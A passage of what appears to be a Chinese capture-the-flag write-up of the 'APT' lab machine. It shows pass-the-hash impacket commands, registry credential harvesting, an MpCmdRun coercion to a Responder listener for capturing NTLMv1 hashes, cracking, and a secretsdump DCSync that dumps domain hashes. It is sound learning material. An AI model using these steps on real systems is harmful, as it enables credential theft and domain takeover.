+<p>Wmiexec.py runs commands as the authenticated <strong>local administrator</strong>, rather than <code>NT AUTHORITY\SYSTEM</code> .Wmiexec.py uses the Windows <strong>Management Instrumentation and DCOM</strong> to create a windows process to run commands. Like some of the above methods, it writes the output out to a <strong>temp file in an SMB share</strong> ( ADMIN$ by default) and then retrieves the output and deletes the file.</p>
+</blockquote>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">dcomexec.py -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> htb.<span class="hljs-keyword">local</span>/henry.vinson<span class="hljs-symbol">@htb</span>.<span class="hljs-keyword">local</span> <br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Dcomexec.py uses the Distributed Component Object Model (<strong>DCOM</strong>) to execute commands. </p>
+</blockquote>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">smbexec.py -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> htb.<span class="hljs-keyword">local</span>/henry.vinson<span class="hljs-symbol">@htb</span>.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>smbexec creates <strong>a batch file for each command</strong> that you run, then creates a service to run the file using cmd.exe. It redirects <code>STDOUT</code> and <code>STDERR</code> to a temporary file on a readable SMB share.This will generate a lot of windows event logs since you’re creating and deleting a lot of services</p>
+</blockquote>
+<h3 id="reg-py"><a href="#reg-py" class="headerlink" title="reg.py"></a>reg.py</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">reg.py -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> -dc-ip htb.<span class="hljs-keyword">local</span> htb.<span class="hljs-keyword">local</span>/henry.vinson<span class="hljs-symbol">@htb</span>.<span class="hljs-keyword">local</span> query -keyName HKU\\<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>This Impacket script is ripped straight out of the reg.exe of the Windows OS. Reg.exe is an executable service that can read, modify and delete registry values when used with eh combination of the query, add, delete keywords respectively. We can even begin to express the importance of access to the registry. Registry controls each and every aspect of the system. It can be used to <strong>gain information</strong> about the various policies, software and also alter some of those policies.</p>
+</blockquote>
+<p>HKU 主键存储的主要是用户凭据相关的信息，因此这里首先尝试查询HKU</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~]<br>└─$ impacket-reg -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[!] Cannot check RemoteRegistry status. Hoping it is started...<br>HKU\<br>HKU\\Console<br>HKU\\Control Panel<br>HKU\\Environment<br>HKU\\Keyboard Layout<br>HKU\\Network<br>HKU\\Software<br>HKU\\System<br>HKU\\Volatile Environment<br></code></pre></td></tr></table></figure>
+
+<p>HKU 包括对于用户和软件的信息，因此我们优先查看 Software，通过对注册表的枚举，我们得到了 <code>GiganticHostingManagementSystem</code> ，这个关键词和 Web 界面的 title 是一致的，所以继续查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~]<br>└─$ impacket-reg -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\Software\\<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[!] Cannot check RemoteRegistry status. Hoping it is started...<br>HKU\Software\<br>HKU\Software\\GiganticHostingManagementSystem<br>HKU\Software\\Microsoft<br>HKU\Software\\Policies<br>HKU\Software\\RegisteredApplications<br>HKU\Software\\Sysinternals<br>HKU\Software\\VMware, Inc.<br>HKU\Software\\Wow6432Node<br>HKU\Software\\Classes<br></code></pre></td></tr></table></figure>
+
+<p>也可以使用 <code>impacket-reg -hashes &#39;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#39; -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU -s</code> 来获取 HKU 下的所有键值</p>
+<p>发现了用户名和密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~]<br>└─$ impacket-reg -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\Software\\GiganticHostingManagementSystem\\Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[!] Cannot check RemoteRegistry status. Hoping it is started...<br>HKU\Software\GiganticHostingManagementSystem\<br>        UserName        REG_SZ   henry.vinson_adm<br>        PassWord        REG_SZ   G1<span class="hljs-comment">#Ny5@2dvht</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>使用此用户名和密码继续尝试横向移动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ evil-winrm -i htb.local -u henry.vinson_adm -p G1<span class="hljs-comment">#Ny5@2dvht</span><br><br>Evil-WinRM shell v3.5<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<p>成功 Getshell，在桌面中找到了 flag</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; dir C:\Users<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/24/</span><span class="hljs-number">2020</span>   <span class="hljs-number">7</span>:<span class="hljs-number">54</span> AM                Administrator<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/24/</span><span class="hljs-number">2020</span>   <span class="hljs-number">8</span>:<span class="hljs-number">39</span> AM                henry.vinson<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/24/</span><span class="hljs-number">2020</span>   <span class="hljs-number">8</span>:<span class="hljs-number">40</span> AM                henry.vinson_adm<br>d-r---       <span class="hljs-number">11</span><span class="hljs-regexp">/21/</span><span class="hljs-number">2016</span>   <span class="hljs-number">2</span>:<span class="hljs-number">39</span> AM                <span class="hljs-keyword">Public</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>四处翻找一下，看看有哪些提权路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; <span class="hljs-built_in">dir</span> C:\<br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        9/24/2020   8:30 AM                backup<br>d-----        9/24/2020   8:19 AM                inetpub<br>d-----        9/16/2020   7:45 PM                PerfLogs<br>d-r---       10/22/2020   5:52 PM                Program Files<br>d-----       11/21/2016   2:36 AM                Program Files (x86)<br>d-----        9/24/2020  11:05 AM                scripts<br>d-r---        9/24/2020   8:40 AM                Users<br>d-----        3/17/2021   3:33 PM                Windows<br></code></pre></td></tr></table></figure>
+
+<p>backup 目录是之前 smb 获取到的共享目录。</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">*Evil</span><span class="hljs-literal">-</span><span class="hljs-comment">WinRM* PS C:\backup</span>&gt; <span class="hljs-comment">dir</span><br><br><br>    <span class="hljs-comment">Directory: C:\backup</span><br><br><br><span class="hljs-comment">Mode                LastWriteTime         Length Name</span><br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-</span><span class="hljs-comment">a</span><span class="hljs-literal">----</span>        <span class="hljs-comment">9/24/2020   8:30 AM       10650961 backup</span><span class="hljs-string">.</span><span class="hljs-comment">zip</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来就是重复翻找的过程，在 Windows Defender 下发现了 <code>MpCmdRun.exe</code> ，利用方法在 <a target="_blank" rel="noopener" href="https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/">Mpcmdrun | LOLBAS (lolbas-project.github.io)</a> 属于 live off the land 思想。但是这里我们并不是要使用它来下载文件，而是<strong>建立连接</strong>，可以查看微软官方文档 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/command-line-arguments-microsoft-defender-antivirus?view=o365-worldwide">Use the command line to manage Microsoft Defender Antivirus | Microsoft Learn</a> </p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">MpCmdRun.exe -<span class="hljs-built_in">Scan</span> -ScanType <span class="hljs-number">3</span> -<span class="hljs-keyword">File</span> \\$IP\noextist<br></code></pre></td></tr></table></figure>
+
+<h3 id="历史文件"><a href="#历史文件" class="headerlink" title="历史文件"></a>历史文件</h3><p>借助于 Auto_Words 中的文件包含目录，搜索 <code>passw</code> 和 <code>history</code> 关键词，发现了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; <span class="hljs-built_in">type</span> C:/users/henry.vinson_adm/appdata/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt<br><span class="hljs-variable">$Cred</span> = get-credential administrator<br>invoke-command -credential <span class="hljs-variable">$Cred</span> -computername localhost -scriptblock &#123;Set-ItemProperty -Path <span class="hljs-string">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> lmcompatibilitylevel -Type DWORD -Value 2 -Force&#125;<br></code></pre></td></tr></table></figure>
+
+<p>而这里出现的获取 administrator 凭证，以及将 lmcompatibilitylevel 设置为 2 都值得我们注意。搜索关键词 <code>lmcompatibilitylevel 2</code> 第一个链接就是微软的官方文档</p>
+<p><img src="/pic/de76b114744ac6eec4d11726ee8475b5_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中提到了客户端使用 NTLMV1 认证，服务器端可以使用 NTLMV1 或 NTLMV2。NTLMV1 实际上是可以被破解的，我们在这里可以进行一些操作，使用的工具是 responder</p>
+<h3 id="NTLMv1-attack-using-responder"><a href="#NTLMv1-attack-using-responder" class="headerlink" title="NTLMv1 attack using responder"></a>NTLMv1 attack using responder</h3><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/ntlm">NTLM - HackTricks</a> 中有关于 <code>NTLMv1 attack</code> 的描述，<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D">Windows下的密码hash——Net-NTLMv1介绍 (3gstudent.github.io)</a> 中有一些关于原理的大概介绍。</p>
+<p><img src="/pic/9ac635a3fa50eae4c7de44cb668e8f7e_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>responder 在 kali 中默认安装，其配置文件位于 <code>/etc/responder/Responder.conf</code> ，修改配置中的 challenge set 值为 1122334455667788</p>
+<p>附注：当输入域名的时候首先使用域名文件 hosts，然后寻找 DNS 缓存，进而是 Web DNS 服务器，最后是在本地使用这三种协议进行寻找（类似于 ARP 的逻辑）推荐阅读：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/256844.html">内网渗透之Responder攻防（上） - FreeBuf网络安全行业门户</a></p>
+<p>首先攻击机使用 responder 开启服务。</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(i3eg1nner㉿racknerd-<span class="hljs-number">4565</span>a8)-<span class="hljs-selector-attr">[~]</span><br>└─$ sudo responder <span class="hljs-attr">--lm</span> -<span class="hljs-selector-tag">I</span> tun0 -v<br></code></pre></td></tr></table></figure>
+
+<p>接着使用 <code>MpCmdRun</code> 来进行连接</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">*Evil-WinRM* PS C:\<span class="hljs-function"><span class="hljs-keyword">Program</span></span> Files\Windows Defender&gt; MpCmdRun.exe -<span class="hljs-built_in">Scan</span> -ScanType <span class="hljs-number">3</span> -<span class="hljs-keyword">File</span> \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>\noextist<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/4ab933898bfdfec96aa737e1e6ed5fc3_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>再次借助于工具，对得到的值进行解析</p>
+<p><img src="/pic/a78891469366b5ec6a3b38d9160074c6_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt/ntlmv1-multi]<br>└─$ python ntlmv1.py --ntlmv1 APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788<br>Hashfield Split:<br>[<span class="hljs-string">&#x27;APT$&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;HTB&#x27;</span>, <span class="hljs-string">&#x27;95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384&#x27;</span>, <span class="hljs-string">&#x27;95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384&#x27;</span>, <span class="hljs-string">&#x27;1122334455667788&#x27;</span>]<br><br>Hostname: HTB<br>Username: APT$<br>Challenge: 1122334455667788<br>LM Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384<br>NT Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384<br>CT1: 95ACA8C7248774CB<br>CT2: 427E1AE5B8D5CE68<br>CT3: 30A49B5BB858D384<br><br>To Calculate final 4 characters of NTLM <span class="hljs-built_in">hash</span> use:<br>./ct3_to_ntlm.bin 30A49B5BB858D384 1122334455667788<br><br>To crack with hashcat create a file with the following contents:<br>95ACA8C7248774CB:1122334455667788<br>427E1AE5B8D5CE68:1122334455667788<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;95ACA8C7248774CB:1122334455667788&quot;</span>&gt;&gt;14000.<span class="hljs-built_in">hash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;427E1AE5B8D5CE68:1122334455667788&quot;</span>&gt;&gt;14000.<span class="hljs-built_in">hash</span><br><br>To crack with hashcat:<br>./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.<span class="hljs-built_in">hash</span> ?1?1?1?1?1?1?1?1<br><br>To Crack with crack.sh use the following token<br>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384<br></code></pre></td></tr></table></figure>
+
+<h3 id="NTLMv1-哈希爆破"><a href="#NTLMv1-哈希爆破" class="headerlink" title="NTLMv1 哈希爆破"></a>NTLMv1 哈希爆破</h3><p>使用 crash.sh 网站尝试获取，网站处于停机维护状态，难绷。试一试 hashcat，上面给的命令不能直接运行，在 <a target="_blank" rel="noopener" href="https://hashcat.net/forum/thread-11104.html">DES Full charset error (hashcat.net)</a> 中找到了一种解决方案。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">.\hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">14000</span> -<span class="hljs-number">1</span> charsets/DES_full<span class="hljs-selector-class">.hcchr</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">3</span> <span class="hljs-attr">--hex-charset</span> <span class="hljs-attr">--hex-charset</span> userpasswdhash ?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span>?<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>不过爆破时间太长了……暂时先直接用别人通过网站拿到的结果吧。后续再咨询咨询有没有什么别的思路。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>APT$的哈希<br>d167c3238864b12f5f82feae86a7f798<br></code></pre></td></tr></table></figure>
+
+<h3 id="secretsdump-DC-Sync-攻击"><a href="#secretsdump-DC-Sync-攻击" class="headerlink" title="secretsdump DC Sync 攻击"></a>secretsdump DC Sync 攻击</h3><p>这里要注意，就算我们能登录 APT$用户，但是对于拿下整台域控来说，并没有那么大的帮助，联想到之前 backup 压缩包里无效的哈希，这里我们可以尝试使用 impacket-secretdump 来获得凭证。这里本质上属于 DC Sync 攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt/ntlmv1-multi]<br>└─$ sudo impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 <span class="hljs-string">&#x27;htb.local/APT$@htb.local&#x27;</span><br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied<br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::<br>henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::<br>APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::<br>[*] Kerberos keys grabbed<br>Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3<br>Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413<br>Administrator:des-cbc-md5:0816d9d052239b8a<br>krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb<br>krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b<br>krbtgt:des-cbc-md5:f8c26238c2d976bf<br>henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2<br>henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af<br>henry.vinson:des-cbc-md5:73b6f71cae264fad<br>henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4<br>henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b<br>henry.vinson_adm:des-cbc-md5:5df8682c8c07a179<br>APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454<br>APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9<br>APT$:des-cbc-md5:76c45245f104a4bf<br>[*] Cleaning up...<br></code></pre></td></tr></table></figure>
+
+<h3 id="evil-winrm-登录"><a href="#evil-winrm-登录" class="headerlink" title="evil-winrm 登录"></a>evil-winrm 登录</h3><p>获取到了 administrator 的哈希，尝试 evil-winrm 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt/ntlmv1-multi]<br>└─$ evil-winrm -i htb.local -u administrator -H <span class="hljs-string">&#x27;c370bddf384a691d811ff3495e8a72e2&#x27;</span><br><br>Evil-WinRM shell v3.5<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">cd</span> ..\Desktop<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span><br><br><br>    Directory: C:\Users\Administrator\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        11/1/2023   4:57 AM             34 root.txt<br></code></pre></td></tr></table></figure>
+
+<p>成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig<br><br>Windows IP Configuration<br><br><br>Ethernet adapter Ethernet:<br><br>   Connection-specific DNS Suffix  . : htb<br>   IPv6 Address. . . . . . . . . . . : dead:beef::16c<br>   IPv6 Address. . . . . . . . . . . : dead:beef::b885:d62a:d679:573f<br>   IPv6 Address. . . . . . . . . . . : dead:beef::dc2a:6438:2e17:c0f3<br>   Link-<span class="hljs-built_in">local</span> IPv6 Address . . . . . : fe80::dc2a:6438:2e17:c0f3%5<br>   IPv4 Address. . . . . . . . . . . : 10.10.10.213<br>   Subnet Mask . . . . . . . . . . . : 255.255.255.0<br>   Default Gateway . . . . . . . . . : dead:beef::1<br>                                       fe80::250:56ff:feb9:381e%5<br>                                       10.10.10.2<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从 APT 靶机开始的内网渗透学习</div>
+      <div>https://i3eg1nner.github.io/2023/10/4af173e66943.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/37d1099dc2a7.html" title="Service Enumeration">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Service Enumeration</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/4a10ecf0c366.html" title="Windows2012活动目录搭建域环境">
+                        <span class="hidden-mobile">Windows2012活动目录搭建域环境</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
